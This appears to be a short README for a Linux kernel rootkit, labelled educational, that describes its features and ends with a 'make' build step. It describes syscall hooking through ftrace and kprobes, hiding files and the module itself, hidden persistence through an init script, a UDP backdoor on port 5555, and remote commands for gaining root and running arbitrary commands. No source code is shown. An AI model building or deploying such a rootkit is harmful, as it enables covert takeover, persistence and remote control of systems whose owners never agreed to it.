# Educational Rootkit (Kernel 6+ Compatible)

This rootkit:
- Hooks syscalls using ftrace and a kprobe to find kallsyms_lookup_name.
- Hides files, directories, and module from `ls`, `cat`, and `/proc/modules`.
- Adds persistence by inserting `insmod /rootkit/rootkit.ko` in /etc/init.d/local and hiding that line.
- Provides a backdoor listening on UDP port 5555.
- Allows remote commands:
  - `root`: elevate current process to root.
  - `exec <cmd>`: run arbitrary command on the host via call_usermodehelper.
  - `hide <filename>`: add a file to the hidden list.

## Compilation

```bash
make
